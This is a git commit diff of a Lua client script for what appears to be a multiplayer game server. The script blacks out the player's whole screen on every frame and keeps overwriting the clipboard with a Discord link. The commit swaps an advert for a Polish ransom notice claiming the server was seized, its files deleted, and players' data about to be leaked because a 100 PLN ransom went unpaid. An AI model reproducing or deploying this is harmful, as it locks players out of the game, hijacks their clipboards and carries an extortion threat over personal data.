5350b461e11fb74ad4af5f068a2c03a1e5740907
SOCZEKDEV <103373053+SOCZEKDEV@users.noreply.github.com>
2024-01-03 23:10:34 +0100

    Update client.lua

--- client.lua
+++ client.lua
@@ -8,7 +8,7 @@ addEventHandler('onClientRender', root, function()
     -- if isConsoleActive() then return end
     dxDrawRectangle(0, 0, sx, sy, 0xFF000000, true)
 
-    dxDrawText('abstentMTA Najlepszy polski serwer', 25, 25, nil, nil, 0xFFFF0000, 1, bold, 'left', 'top', false, false, true)
-    dxDrawText('abstentMTA Najlepszy polski serwer\nhttps://discord.gg/e8dwB7mF\nJest to innowacyjny polski serwer\nLink zostal skopiowany do schowka', 25, 95, nil, nil, 0xFFFFFFFF, 1, medium, 'left', 'top', false, false, true, true)
+    dxDrawText('SERWER ZOSTAŁ PRZEJĘTY PRZEZ PSEUDOL CORP.', 25, 25, nil, nil, 0xFFFF0000, 1, bold, 'left', 'top', false, false, true)
+    dxDrawText('Niestety właściciele tego serwera nie zapłacili okupu w wysokości 100PLN\nInformujemy iż zasoby serwera wkrótce zostaną udostępnione publiczne wraz z danymi graczy. Zasoby na serwerze zostały usunięte\nDziękujemy za gre!', 25, 95, nil, nil, 0xFFFFFFFF, 1, medium, 'left', 'top', false, false, true, true)
     setClipboard("https://discord.gg/e8dwB7mF")
     end)
